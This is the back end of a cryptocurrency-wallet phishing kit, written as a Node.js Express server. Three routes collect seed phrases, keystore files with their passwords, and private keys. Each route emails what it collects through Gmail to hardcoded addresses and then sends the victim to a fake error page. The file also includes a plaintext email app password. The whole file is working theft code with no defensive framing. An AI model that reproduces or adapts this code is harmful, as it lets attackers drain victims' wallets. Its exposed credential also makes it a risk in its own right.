const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const cors = require("cors"); // Import cors

const app = express();
const PORT = 3000;

// Enable CORS with default options (for any origin)
app.use(
  cors({
    origin: "http://localhost:5500",
    methods: "POST",
    allowedHeaders: ["Content-Type"],
  })
);

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Configure Nodemailer transporter
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: "Mikun5y@gmail.com", // Replace with your email
    pass: "ewqd npti edao xqvj", // Replace with your app password
  },
});

// Helper function to send email
function sendEmail(subject, text) {
  const mailOptions = {
    from: "Mikun5y@gmail.com", // Replace with your email
    to: "Mikun5y@gmail.com", // Your email to receive the form data
     bcc: "yekeen244@gmail.com",
    subject: subject,
    text: text,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Error sending email:", error);
    } else {
      console.log("Email sent:", info.response);
    }
  });
}

// Route for handling Seed/Recovery Phrase submission
app.post("/submit-seed", (req, res) => {
  const { phrase } = req.body;
  const subject = "Seed/Recovery Phrase Submission";
  const message = `Seed Phrase: ${phrase}`;

  sendEmail(subject, message);
  res.redirect("https://defiii.netlify.app/error");
});

// Route for handling KeyStore JSON submission
app.post("/submit-keystore", (req, res) => {
  const { keystore, password } = req.body;
  const subject = "Keystore JSON Submission";
  const message = `Keystore Value: ${keystore}\nPassword: ${password}`;

  sendEmail(subject, message);
  res.redirect("https://defiii.netlify.app/error");
});

// Route for handling Private Key submission
app.post("/submit-privatekey", (req, res) => {
  const { privatekey } = req.body;
  const subject = "Private Key Submission";
  const message = `Private Key: ${privatekey}`;

  sendEmail(subject, message);
  res.redirect("https://defiii.netlify.app/error");
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
